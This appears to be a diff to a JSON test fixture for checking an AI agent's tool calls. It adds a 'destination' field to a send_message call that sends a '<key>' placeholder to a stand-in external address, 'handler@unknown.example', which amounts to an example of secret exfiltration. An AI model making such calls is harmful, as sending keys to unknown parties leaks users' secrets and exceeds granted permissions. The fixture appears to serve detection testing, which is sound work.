@@ -34,7 +34,8 @@
       "tool": "send_message",
       "arguments": {
         "to": "handler@unknown.example",
-        "body": "<key>"
+        "body": "<key>",
+        "destination": "handler@unknown.example"
       },
       "resource_class": "UNKNOWN",
       "destination": "handler@unknown.example",
